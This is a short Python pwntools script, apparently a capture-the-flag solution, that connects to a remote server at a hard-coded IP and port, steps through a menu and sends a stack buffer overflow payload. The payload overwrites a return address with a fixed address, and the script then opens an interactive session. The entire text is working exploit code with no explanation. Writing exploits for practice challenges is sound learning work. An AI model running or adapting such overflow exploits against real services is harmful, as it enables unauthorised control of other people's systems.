from pwn import *

io = remote('111.200.241.244', 61729)
# io = process('./pwn')
io.recv()
io.send(b'1\n')
io.recv()
io.send('flag\n')
io.recv()
payload = cyclic(24) + p32(0x804868b) + cyclic(232) + b'\n'
io.send(payload)
print(io.recv())
io.interactive()